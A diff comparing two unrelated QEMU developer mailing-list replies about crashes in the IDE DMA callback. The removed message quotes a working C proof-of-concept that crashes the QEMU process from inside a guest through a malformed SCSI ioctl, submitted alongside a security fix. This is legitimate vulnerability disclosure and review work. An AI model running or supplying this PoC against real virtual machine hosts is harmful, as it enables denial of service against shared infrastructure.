@@ -4,48 +4,45 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 X-Spam-Level: 
 X-Spam-Status: No, score=-8.2 required=3.0 tests=HEADER_FROM_DIFFERENT_DOMAINS,
 	INCLUDES_PATCH,MAILING_LIST_MULTI,SIGNED_OFF_BY,SPF_HELO_NONE,SPF_PASS,
-	USER_AGENT_SANE_1 autolearn=ham autolearn_force=no version=3.4.0
+	URIBL_BLOCKED,USER_AGENT_SANE_1 autolearn=ham autolearn_force=no version=3.4.0
 Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
-	by smtp.lore.kernel.org (Postfix) with ESMTP id 380A7C76190
-	for <qemu-devel@archiver.kernel.org>; Fri, 26 Jul 2019 00:25:30 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTP id 3365DC76190
+	for <qemu-devel@archiver.kernel.org>; Fri, 26 Jul 2019 00:58:28 +0000 (UTC)
 Received: from lists.gnu.org (lists.gnu.org [209.51.188.17])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by mail.kernel.org (Postfix) with ESMTPS id 0EE4E217D4
-	for <qemu-devel@archiver.kernel.org>; Fri, 26 Jul 2019 00:25:29 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org 0EE4E217D4
+	by mail.kernel.org (Postfix) with ESMTPS id F17C822CB8
+	for <qemu-devel@archiver.kernel.org>; Fri, 26 Jul 2019 00:58:27 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org F17C822CB8
 Authentication-Results: mail.kernel.org; dmarc=fail (p=none dis=none) header.from=redhat.com
 Authentication-Results: mail.kernel.org; spf=pass smtp.mailfrom=qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
-Received: from localhost ([::1]:35850 helo=lists1p.gnu.org)
+Received: from localhost ([::1]:35898 helo=lists1p.gnu.org)
 	by lists.gnu.org with esmtp (Exim 4.86_2)
 	(envelope-from <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>)
-	id 1hqo37-0006EQ-72
-	for qemu-devel@archiver.kernel.org; Thu, 25 Jul 2019 20:25:29 -0400
-Received: from eggs.gnu.org ([2001:470:142:3::10]:55153)
+	id 1hqoZ1-0005ia-0z
+	for qemu-devel@archiver.kernel.org; Thu, 25 Jul 2019 20:58:27 -0400
+Received: from eggs.gnu.org ([2001:470:142:3::10]:48163)
  by lists.gnu.org with esmtp (Exim 4.86_2)
- (envelope-from <jsnow@redhat.com>) id 1hqo2u-0005Zq-Jr
- for qemu-devel@nongnu.org; Thu, 25 Jul 2019 20:25:17 -0400
+ (envelope-from <jsnow@redhat.com>) id 1hqoYp-0005Ev-V9
+ for qemu-devel@nongnu.org; Thu, 25 Jul 2019 20:58:17 -0400
 Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
- (envelope-from <jsnow@redhat.com>) id 1hqo2t-0003lE-9G
- for qemu-devel@nongnu.org; Thu, 25 Jul 2019 20:25:16 -0400
-Received: from mx1.redhat.com ([209.132.183.28]:45450)
+ (envelope-from <jsnow@redhat.com>) id 1hqoYo-0007BL-Rx
+ for qemu-devel@nongnu.org; Thu, 25 Jul 2019 20:58:15 -0400
+Received: from mx1.redhat.com ([209.132.183.28]:47476)
  by eggs.gnu.org with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
  (Exim 4.71) (envelope-from <jsnow@redhat.com>)
- id 1hqo2q-0003ei-MY; Thu, 25 Jul 2019 20:25:12 -0400
-Received: from smtp.corp.redhat.com (int-mx07.intmail.prod.int.phx2.redhat.com
- [10.5.11.22])
+ id 1hqoYm-00076k-97; Thu, 25 Jul 2019 20:58:12 -0400
+Received: from smtp.corp.redhat.com (int-mx04.intmail.prod.int.phx2.redhat.com
+ [10.5.11.14])
  (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
  (No client certificate requested)
- by mx1.redhat.com (Postfix) with ESMTPS id 6D4763082201;
- Fri, 26 Jul 2019 00:25:11 +0000 (UTC)
+ by mx1.redhat.com (Postfix) with ESMTPS id ED6BF83F45;
+ Fri, 26 Jul 2019 00:58:10 +0000 (UTC)
 Received: from [10.18.17.145] (dhcp-17-145.bos.redhat.com [10.18.17.145])
- by smtp.corp.redhat.com (Postfix) with ESMTP id 1EDB61001B03;
- Fri, 26 Jul 2019 00:25:03 +0000 (UTC)
-To: Alexander Popov <alex.popov@linux.com>, qemu-block@nongnu.org,
- qemu-devel@nongnu.org, qemu-stable@nongnu.org, mst@redhat.com,
- pmatouse@redhat.com, sstabellini@kernel.org, mdroth@linux.vnet.ibm.com,
- pjp@redhat.com
-References: <1562335669-10127-1-git-send-email-alex.popov@linux.com>
+ by smtp.corp.redhat.com (Postfix) with ESMTP id 6804F67132;
+ Fri, 26 Jul 2019 00:58:10 +0000 (UTC)
+To: shaju.abraham@nutanix.com, qemu-devel@nongnu.org
+References: <1562554503-177179-1-git-send-email-shaju.abraham@nutanix.com>
 From: John Snow <jsnow@redhat.com>
 Openpgp: preference=signencrypt
 Autocrypt: addr=jsnow@redhat.com; prefer-encrypt=mutual; keydata=
@@ -122,22 +119,22 @@ Autocrypt: addr=jsnow@redhat.com; prefer-encrypt=mutual; keydata=
  i0HjnLoJP5jDcoMTabZTIazXmJz3pKM11HYJ5/ZsTIf3ZRJJKIvXJpbmcAPVwTZII6XxiJdh
  RSSX4Mvd5pL/+5WI6NTdW6DMfigTtdd85fe6PwBNVJL2ZvBfsBJZ5rxg1TOH3KLsYBqBTgW2
  glQofxhkJhDEcvjLhe3Y2BlbCWKOmvM8XS9TRt0OwUs=
-Message-ID: <76881947-141b-0a16-c52d-a315203c32eb@redhat.com>
-Date: Thu, 25 Jul 2019 20:25:03 -0400
+Message-ID: <087e6cb5-b24d-b144-744c-d74defeadb86@redhat.com>
+Date: Thu, 25 Jul 2019 20:58:09 -0400
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
  Thunderbird/60.8.0
 MIME-Version: 1.0
-In-Reply-To: <1562335669-10127-1-git-send-email-alex.popov@linux.com>
+In-Reply-To: <1562554503-177179-1-git-send-email-shaju.abraham@nutanix.com>
 Content-Type: text/plain; charset=utf-8
 Content-Language: en-US
 Content-Transfer-Encoding: 7bit
-X-Scanned-By: MIMEDefang 2.84 on 10.5.11.22
+X-Scanned-By: MIMEDefang 2.79 on 10.5.11.14
 X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16
- (mx1.redhat.com [10.5.110.47]); Fri, 26 Jul 2019 00:25:11 +0000 (UTC)
+ (mx1.redhat.com [10.5.110.27]); Fri, 26 Jul 2019 00:58:11 +0000 (UTC)
 X-detected-operating-system: by eggs.gnu.org: GNU/Linux 2.2.x-3.x [generic]
 X-Received-From: 209.132.183.28
-Subject: Re: [Qemu-devel] [QEMU-SECURITY] ide: fix assertion in ide_dma_cb()
- to prevent qemu DoS from quest
+Subject: Re: [Qemu-devel] [PATCH] Fix Guest VM crash due to iSCSI Sense Key
+ error
 X-BeenThere: qemu-devel@nongnu.org
 X-Mailman-Version: 2.1.23
 Precedence: list
@@ -149,127 +146,69 @@ List-Post: <mailto:qemu-devel@nongnu.org>
 List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
 List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
  <mailto:qemu-devel-request@nongnu.org?subject=subscribe>
+Cc: qemu-block@nongnu.org
 Errors-To: qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org
 Sender: "Qemu-devel"
  <qemu-devel-bounces+qemu-devel=archiver.kernel.org@nongnu.org>
 
 
 
-On 7/5/19 10:07 AM, Alexander Popov wrote:
-> This assertion was introduced in the commit a718978ed58a in July 2015.
-> It implies that the size of successful DMA transfers handled in
-> ide_dma_cb() should be multiple of 512 (the size of a sector).
+On 7/7/19 10:55 PM, shaju.abraham@nutanix.com wrote:
+> From: Shaju Abraham <shaju.abraham@nutanix.com>
 > 
-> But guest systems can initiate DMA transfers that don't fit this
-> requirement. Let's improve the assertion to prevent qemu DoS from quests.
+> During the  IDE DMA transfer for a ISCSI target,when libiscsi encounters
+> a SENSE KEY error, it sets the task->sense to  the value "COMMAND ABORTED".
+> The function iscsi_translate_sense() later translaters this error to -ECANCELED
+> and this value is passed to the callback function. In the case of  IDE DMA read
+> or write, the callback function returns immediately if the value of the ret
+> argument is -ECANCELED.
+> Later when ide_cancel_dma_sync() function is invoked  the assertion
+> "s->bus->dma->aiocb == ((void *)0)" fails and the qemu process gets terminated.
+> Fix the issue by making the value of s->bus->dma->aiocb = NULL when
+> -ECANCELED is passed to the callback.
 > 
-> PoC for Linux that uses SCSI_IOCTL_SEND_COMMAND to perform such an ATA
-> command and crash qemu:
-> 
-> #include <stdio.h>
-> #include <sys/ioctl.h>
-> #include <stdint.h>
-> #include <sys/types.h>
-> #include <sys/stat.h>
-> #include <fcntl.h>
-> #include <string.h>
-> #include <stdlib.h>
-> #include <scsi/scsi.h>
-> #include <scsi/scsi_ioctl.h>
-> 
-> #define CMD_SIZE 2048
-> 
-> struct scsi_ioctl_cmd_6 {
-> 	unsigned int inlen;
-> 	unsigned int outlen;
-> 	unsigned char cmd[6];
-> 	unsigned char data[];
-> };
-> 
-> int main(void)
-> {
-> 	intptr_t fd = 0;
-> 	struct scsi_ioctl_cmd_6 *cmd = NULL;
-> 
-> 	cmd = malloc(CMD_SIZE);
-> 	if (!cmd) {
-> 		perror("[-] malloc");
-> 		return 1;
-> 	}
-> 
-> 	memset(cmd, 0, CMD_SIZE);
-> 	cmd->inlen = 1337;
-> 	cmd->cmd[0] = READ_6;
-> 
-> 	fd = open("/dev/sg0", O_RDONLY);
-> 	if (fd == -1) {
-> 		perror("[-] opening sg");
-> 		return 1;
-> 	}
-> 
-> 	printf("[+] sg0 is opened\n");
-> 
-> 	printf("[.] qemu should break here:\n");
-> 	fflush(stdout);
-> 	ioctl(fd, SCSI_IOCTL_SEND_COMMAND, cmd);
-> 	printf("[-] qemu didn't break\n");
-> 
-> 	free(cmd);
-> 
-> 	return 1;
-> }
-> 
-> Signed-off-by: Alexander Popov <alex.popov@linux.com>
+> Signed-off-by: Shaju Abraham <shaju.abraham@nutanix.com>
 > ---
->  hw/ide/core.c | 2 +-
->  1 file changed, 1 insertion(+), 1 deletion(-)
+>  hw/ide/core.c | 1 +
+>  1 file changed, 1 insertion(+)
 > 
 > diff --git a/hw/ide/core.c b/hw/ide/core.c
-> index 6afadf8..304fe69 100644
+> index 6afadf8..78ea357 100644
 > --- a/hw/ide/core.c
 > +++ b/hw/ide/core.c
-> @@ -868,7 +868,7 @@ static void ide_dma_cb(void *opaque, int ret)
+> @@ -841,6 +841,7 @@ static void ide_dma_cb(void *opaque, int ret)
+>      bool stay_active = false;
 >  
->      sector_num = ide_get_sector(s);
->      if (n > 0) {
-> -        assert(n * 512 == s->sg.size);
-> +        assert(n == s->sg.size / 512);
->          dma_buf_commit(s, s->sg.size);
->          sector_num += n;
->          ide_set_sector(s, sector_num);
+>      if (ret == -ECANCELED) {
+> +        s->bus->dma->aiocb = NULL;
+>          return;
+>      }
+>  
 > 
 
-Oh, this is fun.
+The part that makes me nervous here is that I can't remember why we do
+NO cleanup whatsoever for the ECANCELED case.
 
-So you're actually requesting 131072 bytes (256 sectors) but you're
-giving it far too short of a PRDT.
+commit 0d910cfeaf2076b116b4517166d5deb0fea76394
+Author: Fam Zheng <famz@redhat.com>
+Date:   Thu Sep 11 13:41:07 2014 +0800
 
-But ... the prepare_buf callback got anything at all, so it was happy to
-proceed, but the callback chokes over the idea that the SGlist wasn't
-formatted correctly -- it can't deal with partial tails.
+    ide/ahci: Check for -ECANCELED in aio callbacks
 
-I think it might be the case that the sglist needs to be allowed to have
-an unaligned tail, and then the second trip to the dma_cb when there
-isn't any more regions in the PRDT to add to the SGList to transfer at
-least a single sector -- but the IDE state machine still has sectors to
-transfer -- we need to trigger the short PRD clause.
 
-Papering over it by truncating the tail I think isn't sufficient; there
-are other problems this exposes.
+... This looks like we never expected the aio callbacks to ever get
+called with ECANCELED, so we treat this as a QEMU-internal signal.
 
-As an emergency patch, it might be better to just do this whenever we
-see partial tails:
+It looks like we expect these callbacks to do NOTHING in this case; but
+I'm not sure where the IDE state machine does its cleanup otherwise.
+(The DMA might have been canceled, but the DMA and IDE state machines
+still need to exit their loop.)
 
-prepared = ...prepare_buf(s->bus->dma, s->io_buffer_size);
-if (prepared % 512) {
-    ide_dma_error(s);
-    return;
-}
+If you take a look at this patch from 2014 though, there are many other
+spots where we have littered ECANCELED checks that might also cause
+problems if we're receiving error codes we thought we couldn't get normally.
 
-I think that prepare_buf does not give unaligned results if you provided
-*too many* bytes, so the unaligned return only happens when you starve it.
-
-I can worry about a proper fix for 4.2+.
+I am worried this patch papers over something worse.
 
 --js
 
